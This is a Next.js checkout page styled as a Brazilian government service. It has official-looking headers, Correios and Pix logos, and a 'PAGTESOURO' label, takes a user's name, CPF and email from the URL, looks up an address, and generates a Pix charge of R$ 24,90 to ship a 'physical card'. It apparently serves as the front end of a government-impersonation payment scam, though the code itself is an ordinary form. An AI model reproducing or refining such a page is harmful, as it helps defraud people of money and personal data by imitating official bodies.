"use client";

import { GovHeader } from "@/components/GovHeader";
import { CheckCircle2, MapPin, Truck, QrCode, Copy, Check, Lock } from "lucide-react";
import { useState } from "react";
import Image from "next/image";
import { useSearchParams } from "next/navigation";

export default function EntregaPage() {
    const [cep, setCep] = useState("");
    const [address, setAddress] = useState<any>({
        logradouro: "",
        bairro: "",
        localidade: "",
        uf: ""
    });
    const [loadingCep, setLoadingCep] = useState(false);
    const [addressValid, setAddressValid] = useState(false);

    // Steps State
    const [step, setStep] = useState(1); // 1: Address, 2: Shipping Method, 3: Payment
    const [shippingSelected, setShippingSelected] = useState(false);
    const [showPix, setShowPix] = useState(false);
    const [pixData, setPixData] = useState<{ qr_code_base64: string, qr_code_text: string } | null>(null);
    const [loadingPix, setLoadingPix] = useState(false);

    const searchParams = useSearchParams();
    const nome = searchParams.get('nome');
    const cpf = searchParams.get('cpf');
    const email = searchParams.get('email');

    const handleGeneratePix = async () => {
        setLoadingPix(true);
        try {
            const res = await fetch('/api/checkout', {
                method: 'POST',
                body: JSON.stringify({ nome, cpf, email })
            });
            const data = await res.json();
            if (data.success) {
                setPixData(data);
                setShowPix(true);
            } else {
                alert("Erro ao gerar PIX. Tente novamente.");
            }
        } catch (error) {
            console.error(error);
            alert("Erro de conexão.");
        } finally {
            setLoadingPix(false);
        }
    };

    const formatCep = (value: string) => {
        return value
            .replace(/\D/g, '')
            .replace(/(\d{5})(\d)/, '$1-$2')
            .slice(0, 9);
    };

    const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = formatCep(e.target.value);
        setCep(value);

        if (value.length === 9) {
            setLoadingCep(true);
            try {
                const cleanCep = value.replace(/\D/g, '');
                const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
                const data = await res.json();
                if (!data.erro) {
                    setAddress(data);
                    setAddressValid(true);
                } else {
                    setAddressValid(false);
                }
            } catch (error) {
                console.error("Erro ao buscar CEP", error);
            } finally {
                setLoadingCep(false);
            }
        } else {
            setAddressValid(false);
        }
    };

    const confirmAddress = () => {
        if (addressValid) {
            setStep(2);
            setTimeout(() => {
                document.getElementById('shipping-section')?.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        } else {
            alert("Por favor, informe um CEP válido válido para continuar.");
        }
    };

    const selectShipping = () => {
        setShippingSelected(true);
        setTimeout(() => {
            setStep(3);
            document.getElementById('payment-section')?.scrollIntoView({ behavior: 'smooth' });
        }, 500);
    };

    return (
        <div className="min-h-screen bg-slate-50 flex flex-col font-sans text-slate-900">
            <GovHeader />

            <main className="flex-1 container-centered py-10 pb-24">
                <div className="max-w-xl mx-auto">

                    <div className="mb-8 text-center">
                        <h1 className="text-2xl font-bold text-slate-900 mb-2">Finalizar Solicitação</h1>
                        <p className="text-slate-500 text-sm">Confirme o endereço para envio do cartão físico.</p>
                    </div>

                    {/* STEP 1: ADDRESS */}
                    <div className={`bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden mb-6 transition-all duration-300 ${step > 1 ? 'opacity-80' : 'opacity-100 ring-4 ring-blue-50'}`}>
                        <div className="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
                            <div className="flex items-center gap-3">
                                <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm ${step > 1 ? 'bg-green-100 text-green-700' : 'bg-gov-blue-600 text-white'}`}>
                                    {step > 1 ? <Check className="h-5 w-5" /> : '1'}
                                </div>
                                <h3 className="font-bold text-slate-800">Endereço de Entrega</h3>
                            </div>
                            {step > 1 && (
                                <button onClick={() => setStep(1)} className="text-xs text-gov-blue-600 hover:underline">Editar</button>
                            )}
                        </div>

                        {step === 1 && (
                            <div className="p-6 space-y-4 animate-in slide-in-from-top-2">
                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">CEP</label>
                                        <input
                                            value={cep}
                                            onChange={handleCepChange}
                                            placeholder="00000-000"
                                            maxLength={9}
                                            className="w-full p-3 border border-slate-200 rounded-lg focus:ring-2 focus:ring-gov-blue-600 outline-none transition-all font-semibold"
                                        />
                                    </div>
                                    <div className="flex items-end">
                                        <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" className="text-gov-blue-600 text-xs font-medium hover:underline mb-3 ml-2 flex items-center gap-1">
                                            Não sei meu CEP
                                        </a>
                                    </div>
                                </div>

                                {loadingCep && <p className="text-xs text-blue-600 animate-pulse flex items-center gap-2"><div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" /> Buscando endereço...</p>}

                                {/* Address Fields - Always Visible but Disabled until valid */}
                                <div className={`space-y-3 transition-opacity duration-300 ${addressValid ? 'opacity-100' : 'opacity-60 grayscale'}`}>
                                    <div>
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Rua / Logradouro</label>
                                        <input
                                            value={address.logradouro}
                                            readOnly
                                            placeholder="Endereço não encontrado"
                                            className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 font-medium cursor-not-allowed"
                                        />
                                    </div>
                                    <div className="grid grid-cols-3 gap-3">
                                        <div className="col-span-1">
                                            <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Número</label>
                                            <input
                                                placeholder="Nº"
                                                disabled={!addressValid}
                                                className="w-full p-3 border border-slate-200 rounded-lg focus:ring-2 focus:ring-gov-blue-600 outline-none disabled:bg-slate-50"
                                            />
                                        </div>
                                        <div className="col-span-2">
                                            <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Bairro</label>
                                            <input
                                                value={address.bairro}
                                                readOnly
                                                placeholder="Bairro"
                                                className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                            />
                                        </div>
                                    </div>
                                    <div className="grid grid-cols-3 gap-3">
                                        <div className="col-span-2">
                                            <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Cidade</label>
                                            <input
                                                value={address.localidade}
                                                readOnly
                                                placeholder="Cidade"
                                                className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                            />
                                        </div>
                                        <div className="col-span-1">
                                            <label className="block text-xs font-bold text-slate-500 uppercase mb-1">UF</label>
                                            <input
                                                value={address.uf}
                                                readOnly
                                                placeholder="UF"
                                                className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                            />
                                        </div>
                                    </div>

                                    <button
                                        onClick={confirmAddress}
                                        disabled={!addressValid}
                                        className={`
                                            w-full mt-6 text-white font-bold py-4 rounded-xl shadow-md transition-all active:scale-95 flex items-center justify-center gap-2
                                            ${addressValid ? 'bg-gov-green-600 hover:bg-gov-green-700' : 'bg-slate-300 cursor-not-allowed'}
                                        `}
                                    >
                                        Continuar para Opções de Envio
                                    </button>
                                </div>
                            </div>
                        )}

                        {step > 1 && addressValid && (
                            <div className="p-4 px-6 text-sm text-slate-600 bg-slate-50 flex justify-between items-center">
                                <span>{address.logradouro}, {address.bairro} - {address.localidade}/{address.uf}</span>
                            </div>
                        )}
                    </div>

                    {/* STEP 2: SHIPPING METHOD */}
                    {step >= 2 && (
                        <div id="shipping-section" className={`bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden mb-6 transition-all duration-500 ${step === 2 ? 'ring-4 ring-blue-50 opacity-100' : step > 2 ? 'opacity-80' : 'opacity-50 blur-sm'}`}>
                            <div className="p-6 border-b border-slate-100 flex items-center gap-3 bg-slate-50/50">
                                <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm ${step > 2 ? 'bg-green-100 text-green-700' : step === 2 ? 'bg-gov-blue-600 text-white' : 'bg-slate-200 text-slate-500'}`}>
                                    {step > 2 ? <Check className="h-5 w-5" /> : '2'}
                                </div>
                                <h3 className="font-bold text-slate-800">Método de Envio</h3>
                            </div>

                            {(step === 2 || step === 3) && (
                                <div className="p-6 animate-in slide-in-from-bottom-4">
                                    <div
                                        onClick={step === 2 ? selectShipping : undefined}
                                        className={`
                                            relative border-2 rounded-xl overflow-hidden cursor-pointer transition-all hover:shadow-md group flex
                                            ${shippingSelected ? 'border-green-500 bg-green-50/30 ring-4 ring-green-100' : 'border-slate-200 hover:border-green-400'}
                                        `}
                                    >
                                        {/* Official Logo Only - No Box Container */}
                                        <div className="w-24 bg-white flex items-center justify-center p-2 border-r border-slate-100">
                                            <img
                                                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Correios_%282014%29.svg/1920px-Correios_%282014%29.svg.png"
                                                alt="Correios"
                                                className="w-full h-auto object-contain"
                                            />
                                        </div>

                                        <div className="flex-1 p-4">
                                            <div className="flex justify-between items-start mb-1">
                                                <div>
                                                    <h4 className="font-bold text-slate-900 text-sm md:text-base">Carta Registrada + AR</h4>
                                                    <p className="text-xs text-slate-500">Entrega garantida em mão própria</p>
                                                </div>
                                                <div className="text-right">
                                                    <span className="block font-bold text-gov-green-700 text-lg">R$ 24,90</span>
                                                </div>
                                            </div>

                                            <div className="flex items-center gap-2 mt-2">
                                                <span className="text-[10px] text-slate-500 bg-slate-100 px-2 py-1 rounded-full flex items-center gap-1">
                                                    <Lock className="h-3 w-3" /> Rastreado
                                                </span>
                                                <span className="text-[10px] text-green-700 bg-green-50 px-2 py-1 rounded-full font-bold">
                                                    2 a 3 dias úteis
                                                </span>
                                            </div>
                                        </div>

                                        {shippingSelected && (
                                            <div className="absolute top-2 right-2 bg-gov-blue-600 text-white p-1 rounded-full shadow-md animate-in zoom-in">
                                                <CheckCircle2 className="h-4 w-4" />
                                            </div>
                                        )}
                                    </div>
                                </div>
                            )}
                        </div>
                    )}

                    {/* STEP 3: PAYMENT */}
                    {step >= 3 && (
                        <div id="payment-section" className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden animate-in slide-in-from-bottom-8 duration-700">
                            <div className="p-6 border-b border-slate-100 flex items-center gap-3 bg-slate-50/50">
                                <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm bg-gov-blue-600 text-white">
                                    3
                                </div>
                                <h3 className="font-bold text-slate-800">Pagamento Seguro</h3>
                            </div>

                            <div className="p-8 text-center">
                                <div className="mb-6">
                                    <p className="text-sm text-slate-600 mb-2">Valor Total a Pagar:</p>
                                    <div className="text-4xl font-extrabold text-gov-green-600 tracking-tight">R$ 24,90</div>
                                </div>

                                {!showPix ? (
                                    <button
                                        onClick={handleGeneratePix}
                                        disabled={loadingPix}
                                        className="w-full bg-gov-green-600 hover:bg-gov-green-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-green-900/20 transition-all flex items-center justify-center gap-2 group transform active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed"
                                    >
                                        <QrCode className="h-5 w-5" />
                                        {loadingPix ? "Gerando PIX..." : "Gerar PIX para Pagamento"}
                                    </button>
                                ) : (
                                    <div className="bg-slate-50 p-6 rounded-xl border-2 border-green-500/30 animate-in zoom-in duration-300">
                                        <div className="flex justify-center mb-4">
                                            {/* Real Pix QR */}
                                            <div className="bg-white p-2 rounded-lg shadow-sm w-48 h-48 flex items-center justify-center border border-slate-100 relative overflow-hidden group">
                                                {pixData?.qr_code_base64 ? (
                                                    <img
                                                        src={`data:image/png;base64,${pixData.qr_code_base64}`}
                                                        className="w-full h-full object-contain"
                                                        alt="Pix QR Code"
                                                    />
                                                ) : (
                                                    <div className="animate-pulse bg-slate-200 w-full h-full"></div>
                                                )}
                                            </div>
                                        </div>

                                        <div className="flex items-center justify-center gap-2 mb-4 text-green-700 font-bold text-sm bg-green-50 py-1.5 px-3 rounded-full inline-flex mx-auto">
                                            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                                            Aguardando pagamento...
                                        </div>

                                        <p className="text-xs text-slate-500 mb-2 mt-4">Código Pix Copia e Cola:</p>
                                        <div className="flex gap-2">
                                            <input
                                                value={pixData?.qr_code_text || ""}
                                                readOnly
                                                className="w-full p-3 bg-white border border-slate-200 rounded-lg text-slate-500 text-xs font-mono select-all focus:ring-1 focus:ring-green-500 outline-none truncate"
                                            />
                                            <button
                                                onClick={() => {
                                                    if (pixData?.qr_code_text) {
                                                        navigator.clipboard.writeText(pixData.qr_code_text);
                                                        alert("Código copiado!");
                                                    }
                                                }}
                                                className="bg-slate-800 text-white px-4 rounded-lg hover:bg-slate-900 transition-colors shadow-sm"
                                            >
                                                <Copy className="h-4 w-4" />
                                            </button>
                                        </div>
                                    </div>
                                )}

                                <div className="mt-8 flex items-center justify-center gap-4 opacity-60 grayscale hover:grayscale-0 transition-all">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/de/Logo_-_pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.png" className="h-6" alt="Pix" />
                                    <div className="h-4 w-px bg-slate-300"></div>
                                    <span className="text-xs font-bold text-slate-500">PAGTESOURO</span>
                                </div>
                            </div>
                        </div>
                    )}

                </div>
            </main>
        </div>
    );
}
